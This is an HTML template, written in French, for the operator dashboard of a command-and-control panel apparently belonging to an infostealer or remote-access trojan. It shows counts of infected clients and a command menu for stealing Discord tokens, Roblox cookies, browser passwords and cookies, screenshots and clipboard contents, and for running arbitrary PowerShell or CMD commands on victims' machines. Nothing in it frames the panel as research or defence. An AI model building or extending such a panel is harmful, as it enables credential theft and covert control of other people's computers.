<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Panel - Remote Administration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="app-container">
        <!-- SIDEBAR -->
        <aside class="sidebar">
            <div class="logo">
                <span class="logo-icon">🎯</span>
                <span class="logo-text">C2 Panel</span>
            </div>
            <nav class="nav-menu">
                <a href="#" class="nav-item active" data-page="dashboard">
                    <span class="nav-icon">📊</span>
                    <span>Dashboard</span>
                </a>
                <a href="#" class="nav-item" data-page="clients">
                    <span class="nav-icon">🖥️</span>
                    <span>Clients</span>
                </a>
                <a href="#" class="nav-item" data-page="activities">
                    <span class="nav-icon">📋</span>
                    <span>Activités</span>
                </a>
            </nav>
            <div class="sidebar-footer">
                <div class="user-info">
                    <span class="user-icon">👤</span>
                    <span>{{ username }}</span>
                </div>
                <a href="/logout" class="logout-btn">Déconnexion</a>
            </div>
        </aside>

        <!-- MAIN CONTENT -->
        <main class="main-content">
            <!-- HEADER -->
            <header class="header">
                <h1 id="page-title">Dashboard</h1>
                <div class="header-actions">
                    <button class="refresh-btn" onclick="refreshAll()">🔄 Actualiser</button>
                </div>
            </header>

            <!-- DASHBOARD PAGE -->
            <div id="dashboard-page" class="page active">
                <div class="stats-grid" id="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon">💻</div>
                        <div class="stat-info">
                            <h3 id="total-clients">0</h3>
                            <p>Clients totaux</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">🟢</div>
                        <div class="stat-info">
                            <h3 id="online-clients">0</h3>
                            <p>En ligne</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">⏳</div>
                        <div class="stat-info">
                            <h3 id="pending-commands">0</h3>
                            <p>Commandes en attente</p>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">✅</div>
                        <div class="stat-info">
                            <h3 id="executed-commands">0</h3>
                            <p>Commandes exécutées</p>
                        </div>
                    </div>
                </div>
                <div class="recent-activities">
                    <h2>Activités récentes</h2>
                    <div class="activities-list" id="recent-activities"></div>
                </div>
            </div>

            <!-- CLIENTS PAGE -->
            <div id="clients-page" class="page">
                <div class="clients-header">
                    <div class="search-box">
                        <input type="text" id="client-search" placeholder="Rechercher un client..." onkeyup="filterClients()">
                    </div>
                </div>
                <div class="clients-grid" id="clients-grid"></div>
            </div>

            <!-- ACTIVITIES PAGE -->
            <div id="activities-page" class="page">
                <div class="activities-full" id="activities-full"></div>
            </div>
        </main>
    </div>

    <!-- MODAL COMMAND -->
    <div id="command-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Exécuter une commande</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <p>Client: <strong id="modal-client-name"></strong></p>
                <div class="form-group">
                    <label>Type de commande</label>
                    <select id="command-type">
                        <option value="ping">🏓 Ping (test présence)</option>
                        <option value="system_info">💻 System Info</option>
                        <option value="discord_data">🎮 Discord Tokens + Infos</option>
                        <option value="roblox_cookie">🎲 Roblox Cookie</option>
                        <option value="browser_passwords">🔑 Mots de passe navigateurs</option>
                        <option value="browser_cookies">🍪 Cookies navigateurs</option>
                        <option value="screenshot">📸 Capture d'écran</option>
                        <option value="clipboard">📋 Presse-papier</option>
                        <option value="list_processes">📊 Liste des processus</option>
                        <option value="execute_ps">⚡ PowerShell</option>
                        <option value="execute_cmd">💻 CMD</option>
                    </select>
                </div>
                <div class="form-group" id="command-params-group" style="display: none;">
                    <label>Paramètres (JSON)</label>
                    <textarea id="command-params" rows="3" placeholder='{"command": "whoami"}'></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary" onclick="closeModal()">Annuler</button>
                <button class="btn-primary" onclick="executeCommand()">Exécuter</button>
            </div>
        </div>
    </div>

    <!-- MODAL RESULT -->
    <div id="result-modal" class="modal">
        <div class="modal-content modal-large">
            <div class="modal-header">
                <h2>Résultat de la commande</h2>
                <span class="close" onclick="closeResultModal()">&times;</span>
            </div>
            <div class="modal-body">
                <pre id="result-content"></pre>
            </div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
